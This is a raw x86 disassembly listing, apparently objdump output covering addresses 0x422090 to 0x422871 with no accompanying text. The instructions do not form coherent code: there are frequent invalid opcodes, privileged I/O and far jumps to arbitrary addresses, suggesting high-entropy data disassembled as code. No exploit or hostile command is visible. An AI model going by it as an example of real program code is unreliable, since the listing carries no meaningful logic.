  422090:	rcl    BYTE PTR [edx-0x7a],cl
  422093:	fcomi  st,st(4)
  422095:	daa    
  422096:	mov    eax,0xce5ad934
  42209b:	stc    
  42209c:	cdq    
  42209d:	jl     0x422102
  42209f:	ins    BYTE PTR es:[edi],dx
  4220a0:	mov    WORD PTR [eax-0x608171],fs
  4220a6:	test   DWORD PTR [edx-0x77efe6ea],eax
  4220ac:	xor    al,0xca
  4220ae:	cmp    BYTE PTR [ebp+eax*2-0xaf4464],ah
  4220b5:	push   ss
  4220b6:	jecxz  0x4220ce
  4220b8:	pop    esi
  4220b9:	xchg   esp,eax
  4220ba:	(bad)  
  4220bc:	cs jecxz 0x422072
  4220bf:	inc    esp
  4220c0:	rcl    BYTE PTR [ebx],1
  4220c2:	fisttp DWORD PTR [eax+0x722b9d81]
  4220c8:	or     DWORD PTR [ebp+0xc],0xdfafcd9
  4220cf:	sub    al,0x17
  4220d1:	jle    0x4220a1
  4220d3:	aam    0xc1
  4220d5:	or     cl,ah
  4220d7:	pop    edi
  4220d8:	push   eax
  4220d9:	mov    eax,ds:0x6cd57abb
  4220de:	addr16 jb 0x4220e5
  4220e1:	cmp    eax,0x2658a9d2
  4220e6:	mov    ch,0x64
  4220e8:	ror    BYTE PTR [edi],cl
  4220ea:	adc    eax,0x4a6f27b4
  4220ef:	retf   0xd2c5
  4220f2:	cmp    ch,dl
  4220f4:	sbb    al,BYTE PTR [esi]
  4220f6:	sub    al,BYTE PTR [eax-0x19b702c1]
  4220fc:	jecxz  0x4220a4
  4220fe:	mov    cl,0x2d
  422100:	add    eax,0x33eba3f6
  422105:	(bad)  
  422106:	loope  0x4220b5
  422108:	pop    ss
  422109:	stc    
  42210a:	jg     0x4220f1
  42210c:	sahf   
  42210d:	neg    cl
  42210f:	imul   ecx,eax,0x968372f0
  422115:	mov    bl,0x72
  422117:	(bad)  
  422118:	and    ebp,esi
  42211a:	inc    edi
  42211b:	mov    edx,0x1c878b88
  422120:	arpl   WORD PTR [esp+esi*4-0x746754cc],sp
  422127:	xchg   edi,eax
  422128:	ja     0x4220c4
  42212a:	fcmovb st,st(5)
  42212c:	sbb    DWORD PTR [edx+0x7e],ebx
  42212f:	cld    
  422130:	jo     0x422199
  422132:	mov    esp,DWORD PTR [eax+0x2b]
  422135:	dec    ecx
  422136:	mov    ds:0xe0e3338,al
  42213b:	jmp    DWORD PTR fs:[edi-0x581864cf]
  422142:	sbb    ebx,DWORD PTR ds:0x31dd5cf5
  422148:	fcomp  DWORD PTR [ecx+0x45]
  42214b:	xor    eax,0x84bbc60d
  422150:	ret    
  422151:	dec    ebx
  422152:	sbb    DWORD PTR [ecx+0x5f],edx
  422155:	mov    cl,0xeb
  422157:	jno    0x422100
  422159:	or     eax,0xa81fbbca
  42215e:	sbb    eax,0xe312a30c
  422163:	xchg   edx,eax
  422164:	(bad)  
  422165:	xlat   BYTE PTR ds:[ebx]
  422166:	ret    0x8de4
  422169:	mov    esi,0x45a231cb
  42216e:	mov    dh,0x88
  422170:	jo     0x42211a
  422172:	mov    ah,0x18
  422174:	jecxz  0x422116
  422176:	fisttp DWORD PTR [ebx-0x26]
  422179:	dec    edx
  42217a:	push   esi
  42217b:	in     al,0x3c
  42217d:	and    al,0x96
  42217f:	clc    
  422180:	jnp    0x42211d
  422182:	jae    0x42213c
  422184:	pop    ebx
  422185:	xchg   esi,eax
  422186:	mov    ebx,DWORD PTR [esi-0x3f1372e2]
  42218c:	jbe    0x422156
  42218e:	jge    0x4221b8
  422190:	fcmovnbe st,st(6)
  422192:	mov    dh,0x50
  422194:	sbb    al,0x79
  422196:	or     al,0xde
  422198:	mov    eax,0x9a7ff35a
  42219d:	mov    al,0x7b
  42219f:	mov    DWORD PTR [eax*8-0x5c26b6cd],edx
  4221a6:	mov    ch,BYTE PTR [ebp-0x4d845362]
  4221ac:	lods   eax,DWORD PTR ds:[esi]
  4221ad:	dec    edi
  4221ae:	push   edi
  4221af:	hlt    
  4221b0:	retf   0xfa85
  4221b3:	and    BYTE PTR [ebp-0x9],al
  4221b6:	ret    0xdcea
  4221b9:	or     ebx,ecx
  4221bb:	sbb    eax,0x2b8ba918
  4221c0:	ror    DWORD PTR [ecx-0x59],0x7c
  4221c4:	xor    ecx,DWORD PTR [eax+0x6604fd9c]
  4221ca:	fs jne 0x4221f1
  4221cd:	jmp    0x422186
  4221cf:	mov    al,ds:0x259a791d
  4221d4:	mov    es,WORD PTR [edx-0x20]
  4221d7:	fcom   QWORD PTR [ebx+0xb]
  4221da:	sbb    al,0xbb
  4221dc:	pop    ss
  4221dd:	dec    esp
  4221de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221df:	mov    bl,bh
  4221e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221e2:	arpl   WORD PTR [ebx+0x4],bx
  4221e5:	nop
  4221e6:	mov    DWORD PTR [ebp-0x7b488553],esp
  4221ec:	push   esp
  4221ed:	das    
  4221ee:	push   cs
  4221ef:	inc    edi
  4221f0:	jne    0x42218d
  4221f2:	and    ah,ch
  4221f4:	xchg   esp,eax
  4221f5:	sar    DWORD PTR [edx+ebx*4-0x51e496df],1
  4221fc:	lods   eax,DWORD PTR ds:[esi]
  4221fd:	push   es
  4221fe:	push   es
  4221ff:	xor    DWORD PTR [esi-0x53c8026a],ecx
  422205:	mov    ds:0x1935e037,eax
  42220a:	stc    
  42220b:	pop    esp
  42220c:	mov    ebx,0x6b239c89
  422211:	lds    esp,FWORD PTR [esi]
  422213:	dec    esp
  422214:	sub    BYTE PTR [edi-0x49],bh
  422217:	and    al,0x77
  422219:	mov    ds:0x5a92284b,eax
  42221e:	in     al,dx
  42221f:	jnp    0x422294
  422221:	jmp    0x52ad31ee
  422226:	xor    ecx,DWORD PTR [ecx-0x76]
  422229:	or     BYTE PTR [edx-0x2033905b],dl
  42222f:	out    0xc4,eax
  422231:	mov    al,0xbb
  422233:	sub    eax,DWORD PTR ds:0xc5c21051
  422239:	daa    
  42223a:	jnp    0x422233
  42223c:	push   edi
  42223d:	test   eax,0xf740c410
  422242:	aaa    
  422243:	and    BYTE PTR ds:0xd89d2c4c,0xa5
  42224a:	or     ecx,DWORD PTR [ebx+0x129e172f]
  422250:	ret    
  422251:	fs mov ecx,0xb38d3065
  422257:	les    eax,FWORD PTR [ebx]
  422259:	push   eax
  42225a:	je     0x42221a
  42225c:	out    0xd1,al
  42225e:	mov    dl,BYTE PTR [edi+0x6f]
  422261:	lahf   
  422262:	test   al,0x7b
  422264:	mov    bh,0xd
  422266:	outs   dx,DWORD PTR ds:[esi]
  422267:	dec    edi
  422268:	cmp    ecx,ecx
  42226a:	mov    cl,0xc4
  42226c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42226d:	mov    edi,0x67a689fc
  422272:	sbb    ch,al
  422274:	sbb    eax,0x1895e29d
  422279:	add    DWORD PTR [eax-0x18bdc97c],ebx
  42227f:	aam    0xb9
  422281:	pushf  
  422282:	call   0x51e2:0xb9c7940
  422289:	mov    edi,0x2c9317c0
  42228e:	dec    edx
  42228f:	push   eax
  422290:	or     ebp,DWORD PTR [esi+0x2f]
  422293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422294:	xor    BYTE PTR [esi-0x2923294c],al
  42229a:	jl     0x422290
  42229c:	aad    0xaa
  42229e:	pop    edi
  42229f:	hlt    
  4222a0:	jb     0x422308
  4222a2:	test   eax,0xe6491934
  4222a7:	or     DWORD PTR [ebx-0x7d6996f],esi
  4222ad:	test   al,0xb
  4222af:	mov    WORD PTR [ecx+0x4],ds
  4222b2:	ret    
  4222b3:	mov    ebp,0xb09eeac2
  4222b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222b9:	dec    esp
  4222ba:	mov    esi,0x51c1db44
  4222bf:	sbb    al,0x15
  4222c1:	les    eax,FWORD PTR [edx+ebp*8]
  4222c4:	push   ecx
  4222c5:	ret    
  4222c6:	sub    ebp,DWORD PTR [edi-0x13f2c6ce]
  4222cc:	push   ebx
  4222cd:	xlat   BYTE PTR ds:[ebx]
  4222ce:	dec    esp
  4222cf:	cmp    DWORD PTR ds:0x951ce5e0,esp
  4222d5:	and    BYTE PTR [ecx-0x1b],0x22
  4222d9:	lods   al,BYTE PTR ds:[esi]
  4222da:	fldcw  WORD PTR [edx]
  4222dc:	pop    ds
  4222dd:	mov    ecx,0x44c439c8
  4222e2:	pop    edi
  4222e3:	neg    esi
  4222e5:	mov    ds:0x22f6764b,eax
  4222ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222eb:	shr    BYTE PTR [eax-0x5dc515c0],0xea
  4222f2:	mov    cl,0x74
  4222f4:	outs   dx,BYTE PTR ds:[esi]
  4222f5:	dec    esi
  4222f6:	or     eax,0xed94c625
  4222fb:	(bad)  
  4222fc:	and    ah,BYTE PTR [ecx]
  4222fe:	pop    esi
  4222ff:	(bad)  
  422300:	int    0x17
  422302:	mov    ebx,0x277e7eeb
  422307:	push   ebp
  422308:	pop    ds
  422309:	xchg   DWORD PTR [ebx-0x70],ebx
  42230c:	setae  BYTE PTR [ebp+0x15]
  422310:	(bad)  
  422311:	fwait
  422312:	xchg   eax,edx
  422314:	(bad)  
  422315:	mov    edi,0xd9259925
  42231a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42231b:	sub    DWORD PTR [ebx+esi*2+0x5a9709d0],esp
  422322:	in     eax,dx
  422323:	(bad)  
  422324:	ins    BYTE PTR es:[edi],dx
  422325:	jo     0x422354
  422327:	cli    
  422328:	xchg   ebp,eax
  422329:	push   ecx
  42232a:	pop    ebx
  42232b:	out    dx,al
  42232c:	adc    ch,BYTE PTR [edi]
  42232e:	jno    0x422300
  422330:	inc    ebx
  422331:	imul   esi,DWORD PTR [edi-0x4d5ad73c],0xa938854c
  42233b:	repnz cld 
  42233d:	mov    esp,0x7916fd7e
  422342:	sub    BYTE PTR [ecx+0x2c],al
  422345:	(bad)  
  422346:	adc    edi,DWORD PTR [esi+edx*2]
  422349:	mov    ds:0x420496bb,al
  42234e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42234f:	mov    cl,0x91
  422351:	adc    ebx,edx
  422353:	sub    DWORD PTR ds:0xafc4b467,0x0
  42235a:	gs pop ecx
  42235c:	cmc    
  42235d:	cmp    eax,0x6da3ea92
  422362:	xor    dh,BYTE PTR [ecx-0x37d216dc]
  422368:	ins    BYTE PTR es:[edi],dx
  422369:	rol    BYTE PTR [ebx],cl
  42236b:	cld    
  42236c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42236d:	or     BYTE PTR [ecx+ecx*8],0x14
  422371:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422373:	jbe    0x422387
  422375:	adc    dl,BYTE PTR [edx-0x422589d7]
  42237b:	or     BYTE PTR [ecx+edi*4],bl
  42237e:	std    
  42237f:	imul   edx,DWORD PTR [ecx-0x6d932b47],0x67358ba3
  422389:	or     ebx,DWORD PTR [edx-0x44]
  42238c:	jp     0x422362
  42238e:	or     DWORD PTR [esi-0x39],esi
  422391:	cmp    al,0xbf
  422393:	je     0x42231f
  422395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422396:	hlt    
  422397:	pop    DWORD PTR [edi+0x7ab745ee]
  42239d:	rcr    DWORD PTR [edi-0x23],0x98
  4223a1:	adc    eax,0x694abcb2
  4223a6:	adc    BYTE PTR [eax-0x3d226910],ch
  4223ac:	and    eax,0xbedb75aa
  4223b1:	sbb    DWORD PTR [edx+0x5bec454a],0xffffffe5
  4223b8:	stos   BYTE PTR es:[edi],al
  4223b9:	add    al,0x18
  4223bb:	in     al,dx
  4223bc:	sbb    ebx,DWORD PTR [ecx]
  4223be:	inc    BYTE PTR [eax-0x604ab3fa]
  4223c4:	xchg   ebp,eax
  4223c5:	cld    
  4223c6:	or     al,0x69
  4223c8:	xchg   edx,eax
  4223c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223ca:	fwait
  4223cb:	xchg   BYTE PTR [ecx-0x279732e3],ch
  4223d1:	in     eax,dx
  4223d2:	inc    eax
  4223d3:	ds jbe 0x422402
  4223d6:	xchg   edx,eax
  4223d7:	lds    esi,FWORD PTR ds:0x37ea8bb2
  4223dd:	cdq    
  4223de:	jnp    0x4223cc
  4223e0:	push   ebx
  4223e1:	mov    bh,0xb4
  4223e3:	pop    DWORD PTR [edi]
  4223e5:	scas   eax,DWORD PTR es:[edi]
  4223e6:	mov    al,0x42
  4223e8:	cmp    edi,ecx
  4223ea:	mov    edi,0xeaf7b024
  4223ef:	lods   al,BYTE PTR ds:[esi]
  4223f0:	(bad)  
  4223f1:	cmp    eax,0x776403be
  4223f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f7:	cmp    DWORD PTR ds:0xa92e9460,eax
  4223fd:	adc    DWORD PTR [esi-0x7eed756c],edi
  422403:	dec    esi
  422404:	mov    dh,0xf4
  422406:	and    ebx,DWORD PTR [ebx]
  422408:	sbb    cl,BYTE PTR [eax]
  42240a:	ret    
  42240b:	pop    ecx
  42240c:	push   ss
  42240d:	dec    eax
  42240e:	out    dx,al
  42240f:	mov    esp,0x700dd920
  422414:	mov    WORD PTR [edx-0x59707f56],?
  42241a:	sti    
  42241b:	or     bh,dl
  42241d:	daa    
  42241e:	dec    ecx
  42241f:	and    eax,0x82cc45e9
  422424:	sbb    ecx,ecx
  422426:	out    dx,eax
  422427:	fcmovnbe st,st(5)
  422429:	pop    es
  42242a:	jmp    DWORD PTR [ebp+edi*2-0x6d72345d]
  422431:	lods   eax,DWORD PTR ds:[si]
  422433:	popa   
  422434:	and    eax,0xe6e29c60
  422439:	pushf  
  42243a:	mov    ecx,0xff2803f4
  42243f:	sbb    DWORD PTR ds:0xe2ea4dcf,edx
  422445:	jl     0x42248a
  422447:	and    ebx,DWORD PTR [eax-0x67133cf0]
  42244d:	jb     0x422402
  42244f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422450:	fwait
  422451:	hlt    
  422452:	xor    BYTE PTR [edi],ah
  422454:	gs cmp cl,cl
  422457:	out    0xae,eax
  422459:	inc    edx
  42245a:	jne    0x4224bd
  42245c:	and    al,0x59
  42245e:	(bad)  
  42245f:	in     al,0x80
  422461:	or     al,0xa5
  422463:	hlt    
  422464:	lods   eax,DWORD PTR ds:[esi]
  422465:	call   0x30ea:0x16a4e89b
  42246c:	mov    DWORD PTR [esi+0x22],0x33eb8a36
  422473:	data16 shl BYTE PTR [edx],0xfd
  422477:	jns    0x422431
  422479:	mov    al,ds:0xd91a8d13
  42247e:	cmp    edx,ecx
  422480:	and    BYTE PTR [esi-0x66c07191],ch
  422486:	pop    ebx
  422487:	dec    ebp
  422488:	outs   dx,BYTE PTR ds:[esi]
  422489:	pop    edi
  42248a:	xchg   esp,eax
  42248b:	mov    eax,ds:0x65b67e34
  422490:	jmp    FWORD PTR [eax-0x63]
  422493:	push   ss
  422494:	jno    0x4224f2
  422496:	mov    bh,0x74
  422498:	and    al,0x12
  42249a:	ins    BYTE PTR es:[edi],dx
  42249b:	fwait
  42249c:	clc    
  42249d:	lods   eax,DWORD PTR ds:[esi]
  42249e:	jne    0x422483
  4224a0:	mov    BYTE PTR [ecx+0x7e],bh
  4224a3:	in     al,dx
  4224a4:	std    
  4224a5:	rcr    BYTE PTR [edi-0x26],0xf6
  4224a9:	dec    eax
  4224aa:	daa    
  4224ab:	xor    eax,0xb3a66930
  4224b0:	fs xchg ebp,eax
  4224b2:	jns    0x42243f
  4224b4:	jne    0x42245e
  4224b6:	xor    ebp,ebx
  4224b8:	jbe    0x422537
  4224ba:	inc    ebp
  4224bb:	iret   
  4224bc:	and    bh,BYTE PTR [ecx-0x57]
  4224bf:	std    
  4224c0:	sbb    bh,BYTE PTR [ebp+0x6f]
  4224c3:	sbb    eax,0x8baba410
  4224c8:	aaa    
  4224c9:	inc    ebx
  4224ca:	scas   al,BYTE PTR es:[edi]
  4224cb:	mov    cl,0x17
  4224cd:	inc    ebp
  4224ce:	jne    0x42254d
  4224d0:	sti    
  4224d1:	aad    0xb5
  4224d3:	adc    al,0xe1
  4224d5:	repnz inc esp
  4224d7:	mov    BYTE PTR ds:0x16e71dcf,dh
  4224dd:	enter  0xddc2,0x1c
  4224e1:	or     DWORD PTR [ebx],edx
  4224e3:	icebp  
  4224e4:	sbb    cl,ch
  4224e6:	loope  0x422484
  4224e8:	(bad)  
  4224e9:	mov    db6,eax
  4224ec:	mov    cl,ch
  4224ee:	aad    0xed
  4224f0:	jo     0x422571
  4224f2:	mov    bh,0xa9
  4224f4:	pop    es
  4224f5:	mov    dh,0xbb
  4224f7:	aam    0x60
  4224f9:	ins    BYTE PTR es:[edi],dx
  4224fa:	mov    dh,0x5d
  4224fc:	gs mov bh,0x39
  4224ff:	lock fild QWORD PTR [edx-0x2f]
  422503:	shl    BYTE PTR [edx-0x58],cl
  422506:	push   edi
  422507:	pop    esi
  422508:	add    edi,DWORD PTR [ecx-0x3abb9b4a]
  42250e:	push   0xffffffe5
  422510:	add    eax,0x18fa7dd8
  422515:	mov    dl,BYTE PTR fs:[esi+0x69]
  422519:	les    esi,FWORD PTR [ebx]
  42251b:	in     eax,0xc7
  42251d:	mov    ecx,0xa3e18c31
  422522:	sbb    DWORD PTR [ebx],0x8
  422525:	sub    BYTE PTR [esi+edi*8],dh
  422528:	xlat   BYTE PTR ds:[ebx]
  422529:	sahf   
  42252a:	or     al,0x33
  42252c:	inc    esp
  42252d:	jp     0x4225a0
  42252f:	in     al,0x56
  422531:	xor    al,0x5
  422533:	and    DWORD PTR [esi+0x1af246e3],ebx
  422539:	cmp    ecx,edx
  42253b:	ins    BYTE PTR es:[edi],dx
  42253c:	pop    DWORD PTR [esi+0x7a]
  42253f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422540:	jg     0x422546
  422542:	dec    edx
  422543:	(bad)  
  422544:	push   ebp
  422545:	dec    edx
  422546:	cmp    ebp,esi
  422548:	mov    ebp,0xe3a06ca0
  42254d:	stos   BYTE PTR es:[edi],al
  42254e:	aas    
  42254f:	cmc    
  422550:	and    eax,0x42652ff9
  422555:	jl     0x42259f
  422557:	stos   DWORD PTR es:[edi],eax
  422558:	add    eax,0x63f0806d
  42255d:	mov    dl,0x6e
  42255f:	aad    0x6d
  422561:	leave  
  422562:	mov    ebp,0xce7a2807
  422567:	imul   edx,DWORD PTR ds:0x45acb011,0x51ec8477
  422571:	inc    ebp
  422572:	pop    edi
  422573:	cli    
  422574:	pop    ss
  422575:	leave  
  422576:	push   0xebf38a67
  42257b:	mov    dh,0xb2
  42257d:	ror    DWORD PTR [ecx+0x77c4f662],0xa
  422584:	into   
  422585:	push   es
  422586:	(bad)  
  422587:	jmp    0x60f31817
  42258c:	jp     0x422537
  42258e:	in     al,0x64
  422590:	add    BYTE PTR [ebx],bl
  422592:	hlt    
  422593:	push   ebp
  422594:	fldenv [eax-0x583227ce]
  42259a:	mov    eax,DWORD PTR [edx]
  42259c:	cmp    DWORD PTR [edx+0x1a],edi
  42259f:	mov    al,ds:0xc71cf08f
  4225a4:	sti    
  4225a5:	jmp    0x72636a64
  4225aa:	xor    DWORD PTR [ebx-0x1429a9db],eax
  4225b0:	scas   eax,DWORD PTR es:[edi]
  4225b1:	cs into 
  4225b3:	mov    al,0x9f
  4225b5:	or     BYTE PTR [ebx-0x43c6cec6],bl
  4225bb:	mov    ah,0x33
  4225bd:	xlat   BYTE PTR ds:[ebx]
  4225be:	mov    eax,DWORD PTR [esi-0x10584d7b]
  4225c4:	call   0xbc2edba0
  4225c9:	sub    BYTE PTR [ebx+edx*8+0x54b2418a],ch
  4225d0:	inc    ecx
  4225d1:	add    eax,0xec067674
  4225d6:	bound  edi,QWORD PTR fs:[ebp-0x37]
  4225da:	fmul   st(0),st
  4225dc:	sbb    BYTE PTR [edi],ah
  4225de:	dec    BYTE PTR [ebx-0x36]
  4225e1:	and    BYTE PTR [edx-0x1a],ch
  4225e4:	add    dl,dl
  4225e6:	mov    bh,0x34
  4225e8:	push   esp
  4225e9:	sbb    BYTE PTR [ecx],al
  4225eb:	pcmpgtd mm6,QWORD PTR [ecx+0x2c2c4213]
  4225f2:	int3   
  4225f3:	aas    
  4225f4:	add    al,0xc2
  4225f6:	cwde   
  4225f7:	pop    edi
  4225f8:	pop    ss
  4225f9:	xlat   BYTE PTR ds:[ebx]
  4225fa:	pop    es
  4225fb:	mov    ch,0x99
  4225fd:	add    eax,ecx
  4225ff:	cmp    BYTE PTR [ecx+ebp*1],bl
  422602:	lods   al,BYTE PTR ds:[esi]
  422603:	(bad)  
  422604:	loop   0x422595
  422606:	jp     0x42262b
  422608:	mov    ds,WORD PTR [ebx+0xa84a87b]
  42260e:	mov    dl,0x41
  422610:	leave  
  422611:	sbb    cl,al
  422613:	sbb    edx,eax
  422615:	push   ebp
  422616:	mov    bh,0x64
  422618:	clc    
  422619:	push   0x66
  42261b:	imul   ebp,DWORD PTR [si+0x7123],0x2cc191a2
  422624:	inc    ecx
  422625:	mov    ds:0x391cbfd7,al
  42262a:	call   0x18f2bb7c
  42262f:	mov    al,BYTE PTR [edx+0x704d7b9b]
  422635:	(bad)  
  422636:	cmp    al,0x21
  422638:	lea    ebx,[ebx]
  42263a:	xlat   BYTE PTR ds:[ebx]
  42263b:	sbb    DWORD PTR [edx-0x5d],edi
  42263e:	es aad 0x19
  422641:	rsqrtps xmm7,xmm6
  422644:	xlat   BYTE PTR ds:[ebx]
  422645:	pushf  
  422646:	mov    ebp,DWORD PTR [ebx*1-0x925c86]
  42264d:	or     ebx,ebp
  42264f:	push   ds
  422650:	adc    BYTE PTR [edx+0x11cce4b7],bh
  422656:	mov    esp,0xe3672628
  42265b:	pop    ecx
  42265c:	call   0x74559602
  422661:	jle    0x422663
  422663:	mov    edi,0x1548a047
  422668:	ss and ch,dh
  42266b:	add    BYTE PTR ds:0xd55b9456,ah
  422671:	adc    al,0xa3
  422673:	bnd jnp 0x42261a
  422676:	jmp    0xe00b47a8
  42267b:	cdq    
  42267c:	push   cs
  42267d:	lds    edi,FWORD PTR [ecx+ebp*8+0x34]
  422681:	pop    ds
  422682:	(bad)  
  422683:	mov    al,0x21
  422685:	xchg   ecx,eax
  422686:	test   ebp,ebp
  422688:	btc    DWORD PTR [eax],esi
  42268b:	outs   dx,DWORD PTR ds:[esi]
  42268c:	and    eax,0xd94b6389
  422691:	lock sub edx,esi
  422694:	pop    esp
  422695:	sahf   
  422696:	(bad)  [edi-0x2]
  422699:	cmp    al,0x79
  42269b:	dec    edi
  42269c:	mov    edi,ecx
  42269e:	scas   al,BYTE PTR es:[edi]
  42269f:	dec    edi
  4226a0:	xor    esp,DWORD PTR [esi+0x5a07e88b]
  4226a6:	push   eax
  4226a7:	add    al,0xa1
  4226a9:	out    dx,eax
  4226aa:	add    ch,BYTE PTR [ebx]
  4226ac:	cdq    
  4226ad:	xor    BYTE PTR [edx],ah
  4226af:	mov    cs,WORD PTR [edi+0x1e]
  4226b2:	mov    bh,0x7c
  4226b4:	mov    ebx,0xc0d01f11
  4226b9:	aam    0xb9
  4226bb:	hlt    
  4226bc:	scas   al,BYTE PTR es:[edi]
  4226bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226be:	xor    esi,ecx
  4226c0:	(bad)  
  4226c1:	fwait
  4226c2:	mov    fs,WORD PTR [eax]
  4226c4:	lahf   
  4226c5:	dec    eax
  4226c6:	(bad)  
  4226c7:	jnp    0x4226bf
  4226c9:	dec    esp
  4226ca:	mov    eax,0x514b3744
  4226cf:	inc    esp
  4226d0:	mov    ch,0x35
  4226d2:	inc    esp
  4226d3:	out    0x7e,eax
  4226d5:	jl     0x4226e4
  4226d7:	or     al,0x1f
  4226d9:	leave  
  4226da:	cmp    eax,0x54494d2
  4226df:	pop    edx
  4226e0:	inc    ebp
  4226e1:	popf   
  4226e2:	imul   ebx,DWORD PTR [edi],0xffffffb4
  4226e5:	jl     0x42268f
  4226e7:	cld    
  4226e8:	mov    ecx,0x2f72435e
  4226ed:	cld    
  4226ee:	lods   eax,DWORD PTR ds:[esi]
  4226ef:	inc    esi
  4226f0:	bound  edx,QWORD PTR ds:0x75192694
  4226f6:	jmp    FWORD PTR [esi]
  4226f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226f9:	sbb    dl,BYTE PTR [ebp-0x30880ab9]
  4226ff:	jmp    0xfe5bc7d
  422704:	and    BYTE PTR [ecx+0xe12c592],bh
  42270a:	mov    al,ds:0x2ba47bcb
  42270f:	ins    BYTE PTR es:[edi],dx
  422710:	lds    edi,FWORD PTR [esi]
  422712:	mov    BYTE PTR [ebx+edx*8-0x4e43bb26],bh
  422719:	jmp    0x9895:0xaf5b94b7
  422720:	aad    0xb9
  422722:	cs icebp 
  422724:	mov    ch,0xa6
  422726:	loopne 0x4226aa
  422728:	pop    ss
  422729:	dec    ecx
  42272a:	or     BYTE PTR [esi-0x79420e94],0x7f
  422731:	call   0xea0b:0xdd24efeb
  422738:	jno    0x42279c
  42273a:	xchg   esp,eax
  42273b:	mov    edi,0x98771be3
  422740:	jbe    0x422712
  422742:	jmp    0x42275f
  422744:	lods   al,BYTE PTR ds:[esi]
  422745:	and    BYTE PTR [edx],bh
  422747:	dec    esi
  422748:	sub    BYTE PTR [edi+0x4479cb4b],ah
  42274e:	sub    al,0x8a
  422750:	add    DWORD PTR [esp+edi*4-0x7a],esp
  422754:	loop   0x4227c9
  422756:	mov    esi,0x580a5db4
  42275b:	aaa    
  42275c:	jne    0x4227cd
  42275e:	aaa    
  42275f:	icebp  
  422760:	jl     0x4227ac
  422762:	mov    ecx,0x610934a0
  422767:	(bad)  [esi]
  422769:	rcr    BYTE PTR [edx],0x23
  42276c:	mov    al,ds:0xedff6d27
  422771:	cdq    
  422772:	dec    ebx
  422773:	call   0x1a40:0x7b8a8b6
  42277a:	test   eax,0xb2a4a884
  42277f:	and    al,0xd2
  422781:	ret    
  422782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422783:	lods   eax,DWORD PTR ds:[esi]
  422784:	in     eax,0xed
  422786:	das    
  422787:	repz sub eax,0x1f84d060
  42278d:	pop    ecx
  42278e:	xchg   DWORD PTR [ebx-0x360de82f],esi
  422794:	dec    ebp
  422795:	nop
  422796:	sub    al,0xcf
  422798:	jns    0x4227ac
  42279a:	cli    
  42279b:	movlps QWORD PTR [edx+edi*4-0x7e],xmm7
  4227a0:	and    bl,BYTE PTR [ecx]
  4227a2:	jp     0x422783
  4227a4:	ja     0x422765
  4227a6:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227a8:	shl    BYTE PTR [ebx+0x11496484],0x8d
  4227af:	(bad)  
  4227b0:	push   ebx
  4227b1:	sub    eax,0xb8e5ccbc
  4227b6:	jne    0x422792
  4227b8:	push   cs
  4227b9:	fistp  QWORD PTR [edx-0x6186888c]
  4227bf:	rol    DWORD PTR ds:0x76e9d307,0x2f
  4227c6:	mov    BYTE PTR [bp+0x4ba9],0xf4
  4227cc:	push   edx
  4227cd:	retf   
  4227ce:	dec    eax
  4227cf:	cmp    eax,0x63bce976
  4227d4:	lock les ax,DWORD PTR [eax]
  4227d8:	popf   
  4227d9:	jne    0x42281e
  4227db:	jno    0x42276f
  4227dd:	cmp    eax,esi
  4227df:	jb     0x4227be
  4227e1:	sub    eax,0x92c790bd
  4227e6:	jge    0x422773
  4227e8:	mov    ecx,0x1a69b88c
  4227ed:	mov    ds:0xdae15e8a,eax
  4227f2:	ss push edi
  4227f4:	jecxz  0x42278c
  4227f6:	retf   0x47e4
  4227f9:	dec    edi
  4227fa:	mov    cl,0x41
  4227fc:	push   ebp
  4227fd:	or     BYTE PTR [eax+ebx*2+0x7cfba35d],dh
  422804:	les    edi,FWORD PTR [ebp+0x4c269397]
  42280a:	(bad)  
  42280b:	fild   DWORD PTR [esi-0x55eb4484]
  422811:	jbe    0x422834
  422813:	sub    ecx,edi
  422815:	pop    es
  422816:	fs loopne 0x422890
  422819:	aaa    
  42281a:	cwde   
  42281b:	pop    ebp
  42281c:	push   es
  42281d:	sub    dh,BYTE PTR [eax-0x2bf99c0]
  422823:	xchg   ecx,eax
  422824:	test   BYTE PTR [edx+0x492df4b8],bl
  42282a:	call   0xcbe145a8
  42282f:	inc    edi
  422830:	ins    DWORD PTR es:[edi],dx
  422831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422832:	out    0x35,eax
  422834:	push   ebx
  422835:	add    al,0x29
  422837:	repnz mov dl,0x24
  42283a:	mov    ah,0xb7
  42283c:	push   edx
  42283d:	test   al,0xeb
  42283f:	adc    esi,ebp
  422841:	jae    0x422858
  422843:	push   esp
  422844:	add    edi,DWORD PTR [eax]
  422846:	test   BYTE PTR [edx+0x62],bl
  422849:	in     eax,dx
  42284a:	mov    ah,0x74
  42284c:	jg     0x422872
  42284e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42284f:	xchg   edx,eax
  422850:	inc    ebp
  422851:	and    eax,0xf3b1f3c1
  422856:	std    
  422857:	or     al,0x24
  422859:	imul   eax,DWORD PTR [eax],0xa2229165
  42285f:	stos   DWORD PTR es:[edi],eax
  422860:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422862:	retf   
  422863:	cli    
  422864:	sbb    eax,esi
  422866:	sbb    cl,BYTE PTR [edx-0x4635567a]
  42286c:	jg     0x4228d4
  42286e:	lahf   
  42286f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422870:	inc    ebx
  422871:	jecxz  0x422886
